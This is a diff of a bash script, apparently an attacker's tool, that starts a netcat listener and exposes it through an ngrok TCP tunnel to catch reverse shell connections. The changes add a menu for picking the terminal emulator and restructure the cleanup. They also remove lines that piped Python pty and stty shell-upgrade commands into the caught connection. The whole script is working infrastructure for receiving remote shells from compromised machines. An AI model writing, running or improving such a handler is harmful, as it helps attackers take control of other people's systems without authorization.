@@ -10,12 +10,32 @@ function kill_ngrok {
 echo -e "\e[1mEnter port number:\e[0m"
 read port
 
-# Start netcat listener on specified port
+# Start netcat listener on specified port using selected terminal emulator
 echo -e "\e[1mStarting netcat listener on port \e[32m$port\e[0m"
-xterm -e "nc -lvp $port" &
+echo -e "\e[1mSelect terminal emulator to use:\e[0m"
+echo -e "\e[1m[1] Konsole\e[0m"
+echo -e "\e[1m[2] GNOME Terminal\e[0m"
+echo -e "\e[1m[3] xterm\e[0m"
+read choice
+
+case $choice in
+    1)
+        konsole -e "nc -lvp $port" &
+        ;;
+    2)
+        gnome-terminal -- nc -lvp $port &
+        ;;
+    3)
+        xterm -e "nc -lvp $port" &
+        ;;
+    *)
+        echo -e "\e[31mInvalid choice. Exiting...\e[0m"
+        exit 1
+        ;;
+esac
 
 # Create ngrok TCP server on the same port
-echo -e "\e[1mStarting ngrok TCP server on port \e[32m$port\e[0m"
+echo -e "\e[1mTCP tunneling using ngrok to port \e[32m$port\e[0m"
 ngrok tcp $port --log=stdout >/dev/null & disown
 
 # Set trap to kill ngrok and netcat processes when script receives SIGINT signal
@@ -38,20 +58,13 @@ done
 # Wait for netcat connection to be established and then kill ngrok and netcat processes
 while true; do
     if netstat -ant | grep -q $port && ! pgrep -x nc > /dev/null; then
-        pkill ngrok
-        
-        # Try to upgrade the shell
-        if type python > /dev/null 2>&1; then
-            echo -e "\e[1mUpgrading the shell using Python...\e[0m"
-            echo "python -c 'import pty; pty.spawn(\"/bin/bash\")'" | nc -lvp $port &
-        else
-            echo -e "\e[1mUpgrading the shell using stty...\e[0m"
-            echo "stty raw -echo; reset; export SHELL=bash; export TERM=xterm-256color; stty rows $(tput lines) columns $(tput cols)" | nc -lvp $port &
-        fi
-        
-        # Kill the listener process
-        pkill -P $$ 
-        exit 0
+        echo -e "\e[1mReverse shell connection established. Exiting...\e[0m"
+        break
     fi
     sleep 1
 done
+
+# Kill ngrok and netcat processes
+pkill ngrok
+pkill -P $$ 
+exit 0
